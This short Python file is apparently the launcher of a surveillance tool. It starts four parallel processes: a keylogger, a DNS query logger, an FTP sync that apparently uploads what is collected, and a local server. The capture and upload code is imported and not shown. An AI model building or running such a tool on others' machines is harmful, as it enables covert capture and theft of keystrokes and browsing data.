from utilities import dir_path, sync, server
from logger import key_logger, dns_logger
import multiprocessing

def main():
  dir_path()
  p1 = multiprocessing.Process(target=key_logger, name="KeyLogger")
  p2 = multiprocessing.Process(target=dns_logger, name="DNSQuaryLogger")
  p3 = multiprocessing.Process(target=sync, name="SyncFtp")
  p4 = multiprocessing.Process(target=server, name="LocalServer")

  # start the processes
  p1.start()
  p2.start()
  p3.start()
  p4.start()
  # wait for the processes to finish
  p1.join()
  p2.join()
  p3.join()
  p4.join()

if __name__ == "__main__":
    # create two processes for each function
    main()